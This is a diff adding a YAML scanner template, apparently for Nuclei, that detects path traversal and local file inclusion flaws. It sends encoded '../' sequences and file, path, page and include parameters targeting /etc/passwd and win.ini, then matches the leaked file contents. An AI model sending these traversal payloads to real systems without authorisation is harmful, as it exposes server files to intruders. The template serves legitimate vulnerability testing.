@@ -1,0 +1,44 @@
+id: path-traversal-lfi
+info:
+  name: 路径遍历 / 本地文件包含
+  severity: high
+  description: 检测路径遍历和本地文件包含漏洞
+  tags: lfi,path-traversal,high
+  author: poxiao
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/etc/passwd"
+      - "{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "[boot loader]"
+          - "[fonts]"
+          - "root:0:0"
+        condition: or
+        part: body
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../../../../etc/passwd"
+      - "{{BaseURL}}/?path=../../../../../../etc/passwd"
+      - "{{BaseURL}}/?page=../../../../../../etc/passwd"
+      - "{{BaseURL}}/?inc=../../../../../../etc/passwd"
+      - "{{BaseURL}}/?include=../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "[boot loader]"
+        condition: or
+        part: body
